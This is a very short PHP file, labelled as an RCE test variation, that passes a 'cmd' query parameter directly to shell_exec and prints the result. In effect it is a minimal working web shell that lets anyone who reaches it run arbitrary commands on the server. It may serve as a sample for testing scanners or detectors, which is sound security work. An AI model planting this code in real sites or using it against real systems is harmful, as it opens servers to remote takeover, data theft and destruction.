<?php
// RCE test variation #579
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>